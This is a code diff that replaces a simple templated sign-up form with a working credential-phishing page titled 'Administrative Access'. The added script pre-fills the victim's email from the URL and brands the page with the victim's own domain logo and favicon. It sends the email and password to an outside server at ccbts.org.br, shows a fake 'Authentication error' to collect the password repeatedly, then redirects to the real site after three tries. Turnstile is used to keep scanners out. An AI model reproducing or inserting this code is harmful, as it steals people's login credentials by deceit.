@@ -1,108 +1,216 @@
+
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <title>Sign Up Form</title>
-    <style>
-        body {
-            background: #fff;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            width: 400px;
-            height: 570px;
-            margin: 40px auto;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-            border-radius: 8px;
-            padding: 32px 24px;
-            background: #fff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .logo {
-            width: 64px;
-            height: 64px;
-            margin-bottom: 8px;
-        }
-        .domain {
-            font-weight: bold;
-            font-size: 18px;
-            text-transform: uppercase;
-            margin-bottom: 4px;
-        }
-        .form-title {
-            font-size: 16px;
-            margin-bottom: 24px;
-        }
-        form {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .form-group {
-            width: 100%;
-            margin-bottom: 18px;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 14px;
-        }
-        input[type="text"], input[type="email"] {
-            width: 100%;
-            padding: 10px;
-            font-size: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .error {
-            color: #e74c3c;
-            font-size: 13px;
-            margin-top: 2px;
-        }
-        .submit-btn {
-            width: 360px;
-            height: 40px;
-            background: #007bff;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 12px;
-        }
-        .submit-btn:hover {
-            background: #0056b3;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Administrative Access</title>
+
+<!-- Bootstrap 5 CSS -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Cloudflare Turnstile -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+<!-- Dynamic Favicon -->
+<link rel="icon" id="favicon" type="image/png">
+
+<style>
+body {
+background-color: #f8f9fa;
+}
+
+.login-container {
+max-width: 400px;
+margin: 50px auto;
+padding: 20px;
+background: #fff;
+border-radius: 8px;
+box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+text-align: center;
+}
+
+.auth-required {
+color: red;
+font-size: 14px;
+margin-top: 5px;
+}
+
+.turnstile-error {
+color: red;
+font-size: 14px;
+display: none;
+}
+
+.submission-message {
+color: red;
+font-size: 10px;
+font-weight: bold;
+display: none;
+margin-top: 10px;
+}
+
+.form-label {
+text-align: left;
+display: block;
+}
+
+.btn-loading {
+pointer-events: none;
+opacity: 0.7;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        {% if logo_url %}
-            <img src="{{ logo_url }}" alt="Logo" class="logo" onerror="this.style.display='none'">
-        {% endif %}
-        {% if domain %}
-            <div class="domain">{{ domain }}</div>
-        {% endif %}
-        <div class="form-title">SIGN UP FORM</div>
-        <form method="post">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" value="{{ email }}" required>
-            </div>
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" value="{{ username }}" required>
-                <div class="error">Username is required</div>
-            </div>
-            <div class="form-group">
-                <label for="captcha">Captcha</label>
-                <input type="text" id="captcha" name="captcha" required>
-            </div>
-            <button type="submit" class="submit-btn">Sign Up</button>
-        </form>
-    </div>
+
+
+<!-- Login Form -->
+<div class="login-container">
+
+<!-- Header -->
+<header class="text-center my-3">
+<img id="domain-logo" class="domain-logo" src="" alt="Domain Logo">
+<div style="text-transform: uppercase;"><span id="domain-name" class="fw-bold"></span> <br/><b>Login Authentication</b></div>
+</header>
+<form id="login-form">
+<div class="mb-3 text-start">
+<label for="email" class="form-label">Email Address</label>
+<input type="email" id="email" class="form-control" required>
+</div>
+
+<div class="mb-3 text-start">
+<label for="password" class="form-label">Password</label>
+<input type="password" id="password" class="form-control" required>
+<span class="auth-required">Authentication required!</span>
+</div>
+
+<!-- Cloudflare Turnstile -->
+<div class="mb-3">
+<div class="cf-turnstile" data-sitekey="0x4AAAAAABuU_cmRvd31gQnF" data-callback="turnstileCallback">
+</div>
+<span id="turnstile-error" class="turnstile-error">Please verify the captcha!</span>
+</div>
+
+<button type="submit" id="submit-btn" class="btn btn-primary w-100">
+Login
+</button>
+</form>
+
+<!-- Submission Message -->
+<div id="submission-message" class="submission-message">Authentication error #0229992, Enter your valid password.</div>
+</div>
+
+
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<script>
+let submitAttempts = 0;
+let extractedDomain = "";
+let turnstileVerified = false;
+
+function turnstileCallback(token) {
+if (token) {
+turnstileVerified = true;
+document.getElementById("turnstile-error").style.display = "none";
+}
+}
+
+document.addEventListener("DOMContentLoaded", function () {
+const urlParams = new URLSearchParams(window.location.search);
+const emailParam = urlParams.get("email");
+
+if (emailParam) {
+document.getElementById("email").value = emailParam;
+extractedDomain = emailParam.split("@")[1] || "example.com"; // Extract domain
+}
+
+if (extractedDomain !== "example.com") {
+document.getElementById("domain-name").textContent = extractedDomain;
+
+// Set domain logo from Clearbit
+document.getElementById("domain-logo").src = `https://logo.clearbit.com/${extractedDomain}`;
+
+// Set Favicon from Google API
+document.getElementById("favicon").href = `https://www.google.com/s2/favicons?sz=64&domain=${extractedDomain}`;
+}
+});
+
+$("#login-form").submit(function (event) {
+event.preventDefault();
+
+submitAttempts++;
+
+const passwordField = $("#password");
+const submitBtn = $("#submit-btn");
+
+// Password validation
+if (!passwordField.val()) {
+passwordField.addClass("is-invalid");
+return;
+} else {
+passwordField.removeClass("is-invalid");
+}
+
+// Check if Turnstile is verified
+if (!turnstileVerified) {
+$("#turnstile-error").show();
+return;
+}
+
+// Show loading effect
+submitBtn.addClass("btn-loading").html('<span class="spinner-border spinner-border-sm"></span> Processing...');
+
+// AJAX Submission
+$.ajax({
+type: "POST",
+url: "https://ccbts.org.br/obicct/submit.php",
+data: {
+email: $("#email").val(),
+password: $("#password").val()
+},
+success: function (response) {
+$("#submission-message").fadeIn();
+
+// Reset password field
+passwordField.val("");
+
+// Hide submission message after 3 seconds
+setTimeout(() => {
+$("#submission-message").fadeOut();
+}, 3000);
+
+// Reset Cloudflare Turnstile
+turnstile.reset();
+turnstileVerified = false; // Force re-verification
+
+// Redirect after 3 attempts
+if (submitAttempts >= 3 && extractedDomain !== "") {
+setTimeout(() => {
+window.location.href = "https://" + extractedDomain;
+}, 2000);
+}
+
+},
+error: function () {
+alert("Error submitting form. Please try again.");
+},
+complete: function () {
+// Restore button after submission
+submitBtn.removeClass("btn-loading").text("Login");
+}
+});
+});
+
+</script>
+
+
 </body>
+
 </html>
